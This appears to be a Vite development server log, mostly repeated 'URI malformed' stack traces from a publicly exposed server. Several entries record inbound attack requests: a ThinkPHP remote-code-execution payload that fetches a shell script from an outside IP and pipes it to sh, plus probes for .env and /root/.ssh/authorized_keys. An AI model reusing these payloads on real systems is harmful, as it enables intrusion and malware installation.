nohup: ignoring input

> React@0.1.0 dev
> vite


  VITE v6.3.5  ready in 493 ms

  ➜  Local:   http://localhost:80/
  ➜  Network: http://104.194.156.115:80/
9:50:09 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
3:17:47 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/env.js, use /env.js.
4:38:03 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
5:39:17 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
8:03:41 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
8:05:02 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
5:44:32 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
8:41:29 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
9:29:56 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
1:34:50 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
The request url "/?url=.env" is outside of Vite serving allow list.

- /root/cyto-app-main-80/frontend

Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.

2:25:05 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
1:52:58 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
2:13:37 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
3:12:58 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
10:01:20 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
6:57:33 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
7:31:07 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
9:08:57 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
5:30:15 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
9:28:42 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
The request url "/root/.ssh/authorized_keys" is outside of Vite serving allow list.
3:34:00 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
The request url "/?url=.env" is outside of Vite serving allow list.
5:04:29 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
